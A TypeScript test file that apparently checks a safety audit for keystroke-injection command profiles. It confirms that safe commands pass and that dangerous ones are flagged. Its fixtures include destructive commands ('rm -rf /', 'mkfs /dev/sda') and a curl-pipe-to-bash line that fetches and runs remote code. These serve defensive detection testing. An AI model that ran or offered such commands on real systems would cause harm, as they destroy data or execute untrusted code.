import { describe, it, expect } from "vitest";
import { auditCommands, hasCriticalRisk } from "@/lib/safety-check";
import { normalizeProfile } from "@/lib/profiles";

/**
 * E2E profile install validation test: verifies that a profile passes
 * through all three safety layers (web audit, desktop validate, C-app parse).
 *
 * This test catches drift between the web installer, desktop helper, and
 * on-device app when any layer changes its validation logic.
 */

describe("e2e profile validation", () => {
  it("safe profile passes all validation layers", () => {
    // A safe profile with common git commands
    const safeProfile = {
      name: "Git",
      id: "git",
      commands: [
        {
          label: "Git Status",
          type: "text" as const,
          value: "git status\\n",
          delay_ms: 100,
          confirmation_required: true,
          target: "usb_hid" as const,
        },
        {
          label: "Git Commit",
          type: "text" as const,
          value: "git commit -am 'WIP'\\n",
          delay_ms: 100,
          confirmation_required: true,
          target: "usb_hid" as const,
        },
      ],
    };

    // Layer 1: Web installer audit
    const normalized = normalizeProfile(safeProfile);
    const risks = auditCommands(normalized.commands || []);
    expect(hasCriticalRisk(risks)).toBe(false);
    expect(risks).toHaveLength(0);
  });

  it("profile with critical pattern fails all layers", () => {
    // A profile attempting a recursive delete (blocked everywhere)
    const dangerousProfile = {
      name: "Malicious",
      id: "evil",
      commands: [
        {
          label: "Nuke Everything",
          type: "text" as const,
          value: "rm -rf /\\n",
          delay_ms: 0,
          confirmation_required: false,
          target: "usb_hid" as const,
        },
      ],
    };

    // Layer 1: Web installer audit catches it
    const normalized = normalizeProfile(dangerousProfile);
    const risks = auditCommands(normalized.commands || []);
    expect(risks).toHaveLength(1);
    expect(risks[0].label).toBe("Recursive delete");
    expect(hasCriticalRisk(risks)).toBe(true);
  });

  it("profile with warning pattern passes but is flagged", () => {
    // A profile using sudo (warning, not critical)
    const warningProfile = {
      name: "Admin",
      id: "admin",
      commands: [
        {
          label: "Sudo Install",
          type: "text" as const,
          value: "sudo apt-get install -y curl\\n",
          delay_ms: 100,
          confirmation_required: true,
          target: "usb_hid" as const,
        },
      ],
    };

    // Layer 1: Web installer audit flags it as warning but allows it
    const normalized = normalizeProfile(warningProfile);
    const risks = auditCommands(normalized.commands || []);
    expect(risks).toHaveLength(1);
    expect(risks[0].label).toBe("Privilege escalation");
    expect(risks[0].severity).toBe("warning");
    expect(hasCriticalRisk(risks)).toBe(false); // Warnings don't block
  });

  it("remote shell pipe pattern is caught", () => {
    // A profile attempting to pipe curl into bash (critical)
    const pipeProfile = {
      name: "BadPipe",
      id: "badpipe",
      commands: [
        {
          label: "Curl Pipe Bash",
          type: "text" as const,
          value: "curl -fsSL https://example.com/script.sh | bash\\n",
          delay_ms: 0,
          confirmation_required: false,
          target: "usb_hid" as const,
        },
      ],
    };

    // All layers should catch the pipe pattern
    const normalized = normalizeProfile(pipeProfile);
    const risks = auditCommands(normalized.commands || []);
    expect(hasCriticalRisk(risks)).toBe(true);
    expect(risks.some((r) => r.label === "Remote shell pipe")).toBe(true);
  });

  it("profile with multiple commands audits all of them", () => {
    // A profile with mixed safe, warning, and critical commands
    const mixedProfile = {
      name: "Mixed",
      id: "mixed",
      commands: [
        {
          label: "Safe",
          type: "text" as const,
          value: "echo hello\\n",
          delay_ms: 0,
          confirmation_required: true,
          target: "usb_hid" as const,
        },
        {
          label: "Warning",
          type: "text" as const,
          value: "sudo service nginx restart\\n",
          delay_ms: 0,
          confirmation_required: true,
          target: "usb_hid" as const,
        },
        {
          label: "Critical",
          type: "text" as const,
          value: "mkfs /dev/sda\\n",
          delay_ms: 0,
          confirmation_required: false,
          target: "usb_hid" as const,
        },
      ],
    };

    const normalized = normalizeProfile(mixedProfile);
    const risks = auditCommands(normalized.commands || []);
    expect(risks.length).toBeGreaterThan(0);
    expect(hasCriticalRisk(risks)).toBe(true);
    expect(risks.some((r) => r.severity === "warning")).toBe(true);
    expect(risks.some((r) => r.severity === "critical")).toBe(true);
  });
});
